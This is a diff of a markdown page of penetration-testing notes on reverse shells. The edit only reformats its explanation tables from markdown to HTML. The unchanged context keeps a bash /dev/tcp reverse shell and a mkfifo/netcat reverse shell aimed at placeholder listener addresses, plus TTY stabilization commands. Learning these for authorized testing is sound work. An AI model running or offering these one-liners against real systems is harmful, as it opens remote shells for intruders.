@@ -30,11 +30,7 @@ This method is somewhat unreliable but can be tried as a first attempt.
 user@target:~$ bash -i >& /dev/tcp/{Listener-IP}/{PORT} 0>&1
 ```
 
-| Component      | Description                                                                             |
-| -------------- | --------------------------------------------------------------------------------------- |
-| `-i`           | Makes shell interactive                                                                 |
-| `/dev/tcp/...` | Some older Linux distros allow network access via the `/dev/tcp/<IP>/<PORT>` file path  |
-| `0>&1`         | Binds STDIN and STDOUT together (and to the listening port)                             |
+<table><thead><tr><th width="196">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>-i</code></td><td>Makes shell interactive</td></tr><tr><td><code>/dev/tcp/...</code></td><td>Some older Linux distros allow network access via the <code>/dev/tcp/&#x3C;IP>/&#x3C;PORT></code> file path </td></tr><tr><td><code>0>&#x26;1</code></td><td>Binds STDIN and STDOUT together (and to the listening port)</td></tr></tbody></table>
 
 ### Method 2 (Linux)
 
@@ -44,15 +40,7 @@ This method tends to be a more reliable bypass.
 user@target:~$ mkfifo /tmp/f; nc {IP} {PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
-| Component        | Description                                                                                                                                                                                                                               |
-| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `mkfifo /tmp/f`  | Creates a named pipe at `/tmp/f`                                                                                                                                                                                                          |
-| `nc {IP} {PORT}` | Invokes netcat and points it at the IP and PORT of the listener                                                                                                                                                                           |
-| `< /tmp/f`       | Redirects output of named pipe (`/tmp/f`) into netcat connection (returns it to attacker via network)                                                                                                                                     |
-| `\| /bin/sh`     | Pipes the output from netcat to the input of `/bin/sh`                                                                                                                                                                                    |
-| `> /tmp/f`       | Redirects the output from /bin/sh to named pipe                                                                                                                                                                                           |
-| `2>&1`           | <p>Binds (<code>>&#x26;</code> operator) the stderr (output number 2) and the stdout (output number 1).<br><br>Both are going into <code>/tmp/f</code> per step above.</p>                                                                |
-| `rm /tmp/f`      | <p>The named pipe persists as long as the shell connection is active (held in a loop by the redirects).<br><br>Once the connection is broken this ensures the named pipe (created by the attacker) is removed from the target system.</p> |
+<table><thead><tr><th width="194">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>mkfifo /tmp/f</code></td><td>Creates a named pipe at <code>/tmp/f</code></td></tr><tr><td><code>nc {IP} {PORT}</code></td><td>Invokes netcat and points it at the IP and PORT of the listener</td></tr><tr><td><code>&#x3C; /tmp/f</code></td><td>Redirects output of named pipe (<code>/tmp/f</code>) into netcat connection (returns it to attacker via network)</td></tr><tr><td><code>| /bin/sh</code></td><td>Pipes the output from netcat to the input of <code>/bin/sh</code></td></tr><tr><td><code>> /tmp/f</code></td><td>Redirects the output from /bin/sh to named pipe</td></tr><tr><td><code>2>&#x26;1</code></td><td>Binds (<code>>&#x26;</code> operator) the stderr (output number 2) and the stdout (output number 1).<br><br>Both are going into <code>/tmp/f</code> per step above.</td></tr><tr><td><code>rm /tmp/f</code></td><td>The named pipe persists as long as the shell connection is active (held in a loop by the redirects).<br><br>Once the connection is broken this ensures the named pipe (created by the attacker) is removed from the target system.</td></tr></tbody></table>
 
 ## Stabilization Techniques
 
@@ -82,11 +70,7 @@ kali@kali:~$ export TERM=xterm
 kali@kali:~$ stty raw -echo; fg
 ```
 
-| Command             | Action                                                                                                                                                                                                                      |
-| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `export TERM=xterm` | Sets xterm as the terminal window manager                                                                                                                                                                                   |
-| `stty raw -echo`    | <p>Sets I/O to standard device and turns off attacker's own terminal echo.<br><br>Gives access to tab autocomplete, arrow key usage, and <code>Ctrl + C</code> can be used to kill processes without exiting the shell.</p> |
-| `fg`                | Foregrounds the shell job.                                                                                                                                                                                                  |
+<table><thead><tr><th width="221">Command</th><th>Action</th></tr></thead><tbody><tr><td><code>export TERM=xterm</code></td><td>Sets xterm as the terminal window manager</td></tr><tr><td><code>stty raw -echo</code></td><td>Sets I/O to standard device and turns off attacker's own terminal echo.<br><br>Gives access to tab autocomplete, arrow key usage, and <code>Ctrl + C</code> can be used to kill processes without exiting the shell.</td></tr><tr><td><code>fg</code></td><td>Foregrounds the shell job.</td></tr></tbody></table>
 
 This technique is discussed more thoroughly in [this](https://www.infosecademy.com/netcat-reverse-shells/) blog.
 
